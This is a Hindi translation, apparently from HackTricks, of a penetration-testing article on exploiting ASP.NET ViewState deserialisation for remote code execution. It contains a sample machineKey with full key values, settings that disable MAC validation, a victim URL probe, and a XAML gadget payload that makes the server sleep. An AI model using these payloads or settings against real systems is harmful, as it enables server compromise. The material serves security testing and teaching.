<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред**

</details>


**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрд░реЛрдд рд╕реЗ рдирд┐рдХрд╛рд▓реА рдЧрдИ рд╣реИ** [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

# рдкрд░рд┐рдЪрдп

ASP.NET рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди ViewState рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдкреЗрдЬ рд╕реНрдерд┐рддрд┐ рдмрдирд╛рдП рд░рдЦрдиреЗ рдФрд░ рд╡реЗрдм рдлрд╝реЙрд░реНрдо рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕рдВрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред

рдпрд╣ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрд╣рд╛рдВ рдПрдХ рдорд╛рдиреНрдп ViewState рдЬрд╛рд▓реА рдмрдирд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред рдпрд╣ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм **MAC рд╕рддреНрдпрд╛рдкрди** рд╕реБрд╡рд┐рдзрд╛ рдХреЛ **рдЕрдХреНрд╖рдо** рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ рдпрд╛ рдЬрд╛рдирддреЗ рд╣реЛрдВ:

* **.NET Framework рд╕рдВрд╕реНрдХрд░рдг 4.5 рд╕реЗ рдкрд╣рд▓реЗ** рдХреЗ рд▓рд┐рдП **рд╕рддреНрдпрд╛рдкрди рдХреБрдВрдЬреА рдФрд░ рдЗрд╕рдХрд╛ рдПрд▓реНрдЧреЛрд░рд┐рджрдо**
* **.NET Framework рд╕рдВрд╕реНрдХрд░рдг 4.5 рдпрд╛ рдЙрд╕рд╕реЗ рдКрдкрд░** рдореЗрдВ **рд╕рддреНрдпрд╛рдкрди рдХреБрдВрдЬреА, рд╕рддреНрдпрд╛рдкрди рдПрд▓реНрдЧреЛрд░рд┐рджрдо, рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдФрд░ рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рджрдо** рдХреЛ рдЬрд╛рдирддреЗ рд╣реЛрдВ

рд╣реЗрд░рдлреЗрд░ рдЖрдХреНрд░рдордгреЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, .NET Framework рд╡рд╣ ViewState рдХреЛ **рд╕рд╛рдЗрди рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ `LosFormatter` рдХрдХреНрд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрдХрд▓рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдлрд┐рд░ рдпрд╣ рд╕рдВрдХреЗрдд рд╕рддреНрдпрд╛рдкрди рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рд╕рддреНрдпрд╛рдкрди рдХрд░рддрд╛ рд╣реИред `ObjectStateFormatter` рдХрдХреНрд╖рд╛ рд╕рд╛рдЗрди рдХрд░рдиреЗ, рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдФрд░ рд╕рддреНрдпрд╛рдкрди рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░реНрдп рдХрд░рддреА рд╣реИред рд╕рд╛рдЗрди рдФрд░/рдпрд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ **рдХреБрдВрдЬреА** рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **`web.config`** (рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрддрд░) рдпрд╛ **`machine.config`** (рдорд╢реАрди рд╕реНрддрд░) рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ **`machineKey`** рдЦрдВрдб рдореЗрдВред рдпрд╣ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ рд╣реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕реЗрд╡рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреЛ рдЕрдХреНрд╕рд░ рдПрдХ рд╡реЗрдм рдлрд╝рд╛рд░реНрдо рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдПрдХ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдХреЗ рдкреАрдЫреЗ рд╣реЛрддреЗ рд╣реИрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рдПрдХ ASP.NET рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `machineKey` рдЦрдВрдб рдХрд╛ рдкреНрд░рд╛рд░реВрдк рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ .NET Framework рд╕рдВрд╕реНрдХрд░рдг 2.0 рдпрд╛ рдЙрд╕рд╕реЗ рдКрдкрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:
```markup
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />
<machineKey validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" validation="SHA1" decryption="AES"  />
```
рдзреНрдпрд╛рди рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЬрдм рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `machineKey` рдзрд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдпрд╛ рдЬрдм `validationKey` рдФрд░ `decryptionKey` рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ `AutoGenerate` рдкрд░ рд╕реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИрдВ, рддреЛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХрд▓реА рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдЧреБрдкреНрдд рд╕реЗ рдЖрдзрд╛рд░рд┐рдд рдЖрд╡рд╢реНрдпрдХ рдорд╛рдиреЛрдВ рдХреЛ рдбрд╛рдЗрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ**ред рдПрд▓реНрдЧреЛрд░рд┐рджрдо рднреА рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЪреБрдиреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд╡рд░реНрддрдорд╛рди рдореЗрдВ .NET Framework рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рдиреНрдпрддрд╛ рдПрд▓реНрдЧреЛрд░рд┐рджрдо `HMACSHA256` рд╣реИ рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рджрдо `AES` рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [\[13\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection) рджреЗрдЦреЗрдВред

# рдЕрдХреНрд╖рдо ViewState MAC рд╕рддреНрдпрд╛рдкрди рдХреЗ рд╕рд╛рде RCE

рдкрд╣рд▓реЗ, `enableViewStateMac` рд╕рдВрдкрддреНрддрд┐ рдХреЛ `False` рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ **MAC рд╕рддреНрдпрд╛рдкрди рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛** рд╕рдВрднрд╡ рдерд╛ред рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдиреЗ рд╕рд┐рддрдВрдмрд░ 2014 рдореЗрдВ рдПрдХ рдкреИрдЪ рдЬрд╛рд░реА рдХрд┐рдпрд╛ [\[3\]](https://devblogs.microsoft.com/aspnet/farewell-enableviewstatemac/) рдЬрд┐рд╕рд╕реЗ .NET Framework рдХреЗ рд╕рднреА рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЗрд╕ рд╕рдВрдкрддреНрддрд┐ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдХреЗ MAC рд╕рддреНрдпрд╛рдкрди рдХреЛ рдкреНрд░рднрд╛рд╡реА рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рдореЗрдВ рд╕реЗ рдХреБрдЫ рд▓реЛрдЧ рдпрд╣ рдорд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ "_ViewState MAC рдЕрдм рдФрд░ рдЕрдХреНрд╖рдо рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ_" [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET), рд▓реЗрдХрд┐рди **рдЕрдм рднреА MAC рд╕рддреНрдпрд╛рдкрди рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ** рдЬрдм `AspNetEnforceViewStateMac` рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдХреЛ рд╢реВрдиреНрдп рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **рдЦрддрд░рдирд╛рдХ рд╕реЗрдЯрд┐рдВрдЧ** рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрддрд░ рдХреЗ `web.config` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рд╕реЗ MAC рд╕рддреНрдпрд╛рдкрди рднреА рдЕрдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```markup
<configuration>
тАж
<appSettings>
<add key="aspnet:AllowInsecureDeserialization" value="true" />
</appSettings>
</configuration>
```
{% hint style="danger" %}
рдЬрдм ViewState MAC рд╕рддреНрдпрд╛рдкрди рдЕрдХреНрд╖рдо рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ [YSoSerial.Net](https://github.com/pwntester/ysoserial.net) рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `LosFormatter` payloads рдХреЛ ViewState рдХреЗ рд░реВрдк рдореЗрдВ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рдкрд░ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
{% endhint %}

**.NET Framework** рд╕рдВрд╕реНрдХрд░рдг **4.5** рд╕реЗ **рдкрд╣рд▓реЗ**, `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛** рдЬрдмрдХрд┐ MAC рд╕рддреНрдпрд╛рдкрди рд╕реБрд╡рд┐рдзрд╛ рдЕрдХреНрд╖рдо рдереАред рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ **рдЕрдзрд┐рдХрд╛рдВрд╢** **рд╕реНрдХреИрдирд░** **рдЗрд╕ рджреБрд░реНрдмрд▓рддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб ViewState рдкреИрд░рд╛рдореАрдЯрд░ рднреЗрдЬрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ MAC рд╕рддреНрдпрд╛рдкрди рдЕрдХреНрд╖рдо рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП **рдореИрдиреНрдпреБрдЕрд▓** **рдЯреЗрд╕реНрдЯрд┐рдВрдЧ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕реЗ `__VIEWSTATE` рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдПрдХ рдЫреЛрдЯреА рд╕реА рдпрд╛рджреГрдЪреНрдЫрд┐рдХ base64 рд╕реНрдЯреНрд░рд┐рдВрдЧ рднреЗрдЬрдХрд░ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд URL рдореЗрдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
https://victim.com/path/page.aspx?__VIEWSTATE=AAAA
```
рдпрджрд┐ рд▓рдХреНрд╖рд┐рдд рдкреГрд╖реНрда **рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рддреЛ MAC рд╕рддреНрдпрд╛рдкрди рд╕реБрд╡рд┐рдзрд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХреА рдЧрдИ рд╣реИ** рдЕрдиреНрдпрдерд╛ рдпрд╣ MAC рд╕рддреНрдпрд╛рдкрди рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЛ рджрдмрд╛ рджреЗрддрд╛ рд╣реЛрдЧрд╛ред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдРрд╕реЗ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдк рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдирд╣реАрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рддрд░реАрдХрд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕реНрдХреИрдирд░реНрд╕ рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдПрдХ рдЫреЛрдЯреА рд╕рдВрд╡рд┐рд▓рдореНрдм рдХрд╛ рдХрд╛рд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ **рдкреЗрд▓реЛрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд ASP.NET рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ 10 рд╕реЗрдХрдВрдб рдХреА рджреЗрд░реА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ:
```
System.Threading.Thread.Sleep(10000);
```

```bash
string xaml_payload = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:System=""clr-namespace:System;assembly=mscorlib""
xmlns:Thr=""clr-namespace:System.Threading;assembly=mscorlib"">
<ObjectDataProvider x:Key=""x"" ObjectType = ""{ x:Type Thr:Thread}"" MethodName = ""Sleep"" >
<ObjectDataProvider.MethodParameters>
<System:Int32>10000</System:Int32>
</ObjectDataProvider.MethodParameters>
</ObjectDataProvider>
</ResourceDictionary>";
```
# RCE ViewState MAC Validation рдХреЗ рд╕рд╛рде

рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ (**4.5 рд╕реЗ рдкрд╣рд▓реЗ**) рдореЗрдВ, .NET Framework **`TemplateSourceDirectory`** property [\[15\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.control.templatesourcedirectory) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬрдм рдПрдХ serialized object рдХреЛ **рд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ**. рд╣рд╛рд▓рд╛рдВрдХрд┐, **4.5 рд╕рдВрд╕реНрдХрд░рдг** рд╕реЗ, рдпрд╣ **`Purpose`** strings рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрд╢ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ. рдЗрди рджреЛрдиреЛрдВ рдореЗрдХреЗрдирд┐рдЬрд╝рдореНрд╕ **рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЬрдбрд╝ рдореЗрдВ рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ**. рдпреЗ рдкреИрд░рд╛рдореАрдЯрд░ **URL рд╕реЗ рдирд┐рдХрд╛рд▓реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**.

рдРрд╕реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЬреЛ **рдкреБрд░рд╛рдиреЗ framework рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ ViewState рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рдмрд┐рдирд╛ рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП ViewState рдХреЛ рднреА рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**. рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рддреНрдпрд╛рдкрди рдХреБрдВрдЬреА рдФрд░ рдЙрд╕рдХреА рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ рдЬрд╛рдирдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ**. рд▓рдЧрддрд╛ рд╣реИ ViewState рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реЛрддрд╛ рд╣реИ **4.5 рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдмрд╛рдж рд╕реЗ** рдЬрдмрдХрд┐ `viewStateEncryptionMode` property рдХреЛ `Never` рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ. рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдирд╡реАрдирддрдо .NET Framework рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ **рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдФрд░ рдЙрд╕рдХреА рдПрд▓реНрдЧреЛрд░рд┐рджрдо рднреА рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреЗ рд╣реИрдВ** рдПрдХ payload рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП.

ASP.NET ViewState рдореЗрдВ `ViewStateUserKey` property рд╣реЛрддреА рд╣реИ [\[16\]](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972969\(v=msdn.10\)) рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ cross-site request forgery (CSRF) рд╣рдорд▓реЛрдВ [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET) рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ. **`ViewStateUserKey`** property рдХреА рдорд╛рди (рдЬрдм рдпрд╣ `null` рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**) ViewState рд╕рд╛рдЗрдирд┐рдВрдЧ** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ. рдпрд╣ рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдорд╛рди рди рдЬрд╛рдирдиреЗ рд╕реЗ рд╣рдорд╛рд░реЗ рд╣рдорд▓реЗ рдХреЛ рд░реЛрдХ рд╕рдХрддреА рд╣реИ, **рдЗрд╕рдХреА рдорд╛рди рдЕрдХреНрд╕рд░ рдХреБрдХреАрдЬрд╝ рдпрд╛ рдПрдХ рдЫрд┐рдкреА рд╣реБрдИ рдЗрдирдкреБрдЯ** рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ ([\[17\]](https://software-security.sans.org/developer-how-to/developer-guide-csrf) рдореЗрдВ рдПрдХ рд▓рд╛рдЧреВ рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддрд╛ рд╣реИ).

## ViewState YSoSerial.Net plugins

YSoSerial.Net рдорд╛рд╕реНрдЯрд░ рдФрд░ YSoSerial.Netv2 рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдкреНрд▓рдЧрдЗрди рдорд┐рд▓реЗрдЧрд╛ ([**рдпрд╣**](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs) рдФрд░ [**рдпрд╣**](https://github.com/pwntester/ysoserial.net/blob/v2/ysoserial/Plugins/ViewStatePlugin.cs)) рдЬреЛ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирдХрд╛рд░реА рдЬрдм рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдЙрдкрд▓рдмреНрдз рд╣реЛрддреА рд╣реИ.

### **.NET Framework >= 4.5 рдХреЗ рд▓рд┐рдП:**
```bash
